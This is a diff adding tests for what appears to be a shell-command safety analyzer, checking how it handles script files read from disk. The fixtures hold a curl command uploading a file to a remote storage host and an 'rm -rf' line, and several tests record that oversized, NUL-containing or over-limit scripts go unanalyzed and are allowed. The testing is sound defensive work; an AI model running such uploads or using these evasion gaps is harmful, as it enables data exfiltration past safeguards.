@@ -1,4 +1,5 @@
 import { afterAll, describe, expect, test } from 'bun:test';
+import { execFileSync } from 'node:child_process';
 import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir as systemTempRoot } from 'node:os';
 import { join, sep } from 'node:path';
@@ -1209,5 +1210,90 @@ describe('analyzer budget breaches', () => {
     expect(decision(nestShellWrappers(9, 'rm -rf /some/path'), standard)?.ruleId).toBe(
       'rm.recursive-force-outside-cwd',
     );
+  });
+});
+
+describe('script files read from disk', () => {
+  const scripts = join(workspace, 'disk-scripts');
+  const upload =
+    'curl -X PUT --data-binary @payload.bin http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin';
+  const derivedWorkBreach = `unknown-head ${repeatWords(181, () => 'bash')}`;
+  const derivedWorkNearCap = `unknown-head ${repeatWords(180, () => 'bash')}`;
+  mkdirSync(scripts, { recursive: true });
+  for (const [name, body] of [
+    ['upload.sh', `${upload}\n`],
+    ['large-upload.sh', `${'# padding\n'.repeat(30_000)}${upload}\n`],
+    ['long-benign.sh', 'echo step a b c d e f g h\nls -la build\n'.repeat(1_000)],
+    ['over-limit.sh', `${derivedWorkBreach}\n${upload}\n`],
+    ['near-limit.sh', `${derivedWorkNearCap}\n`],
+    ['self.sh', `sh self.sh\nsh self.sh\nsh self.sh\n${upload}\n`],
+    ['once.sh', 'sh once.sh\necho done\n'],
+    ['thrice.sh', 'sh thrice.sh\nsh thrice.sh\nsh thrice.sh\necho done\n'],
+    ['binary-tool', `#!/bin/sh\n${upload}\n\0`],
+    ['located.sh', `echo first\n${upload}\n`],
+    ['runs-located.sh', 'echo a\necho b\nsh located.sh\n'],
+  ] as const) {
+    writeFileSync(join(scripts, name), body);
+  }
+
+  const at = (command: string, analysis = standard) => decisionAt(scripts, command, analysis);
+
+  test.skipIf(process.platform === 'win32')('a FIFO named as a script is not opened', () => {
+    execFileSync('mkfifo', [join(scripts, 'pipe.sh')]);
+    expect(at('sh pipe.sh')).toBeNull();
+    expect(at('./pipe.sh')).toBeNull();
+  });
+
+  test('a script over the size cap is not read', () => {
+    expect(at('sh upload.sh')).toMatchObject({ kind: 'deny', ruleId: 'network.upload-remote' });
+    expect(at('sh large-upload.sh')).toBeNull();
+  });
+
+  test('a long benign script is allowed at every level', () => {
+    for (const analysis of [standard, strict, paranoidRm, paranoidInterpreters]) {
+      expect(at('sh long-benign.sh', analysis), analysis.label).toBeNull();
+    }
+  });
+
+  test('a script that exceeds an analysis limit keeps the command allowed', () => {
+    expect(at(derivedWorkBreach)).toMatchObject({
+      kind: 'deny',
+      ruleId: 'analysis.derived-command-limit',
+    });
+    expect(at('sh over-limit.sh')).toBeNull();
+    expect(at('sh over-limit.sh', strict)).toBeNull();
+  });
+
+  test('a script is analyzed within its own limits, not the outer command budget', () => {
+    expect(at(`${derivedWorkNearCap}; sh near-limit.sh`)).toBeNull();
+  });
+
+  const fastest = (command: string) =>
+    Math.min(
+      ...[0, 1, 2].map(() => {
+        const started = performance.now();
+        expect(at(command)).toBeNull();
+        return performance.now() - started;
+      }),
+    );
+
+  test('a script that runs itself stays bounded and still reaches its upload', () => {
+    expect(fastest('sh thrice.sh') / fastest('sh once.sh')).toBeLessThan(24);
+    expect(at('sh self.sh')).toMatchObject({ kind: 'deny', ruleId: 'network.upload-remote' });
+  });
+
+  test('running a self-calling script many times in one command stays bounded', () => {
+    const repeated = Array.from({ length: 16 }, () => 'sh thrice.sh').join('; ');
+    expect(fastest(repeated) / fastest('sh thrice.sh')).toBeLessThan(4);
+  });
+
+  test('a script run by another script is named by its own file and line', () => {
+    const reason = at('sh runs-located.sh')?.reason;
+    expect(reason).toStartWith('located.sh:2: This uploads data to a remote host');
+    expect(reason).not.toContain('runs-located.sh');
+  });
+
+  test('an executable holding a NUL byte is not analyzed as a script', () => {
+    expect(at('./binary-tool')).toBeNull();
   });
 });
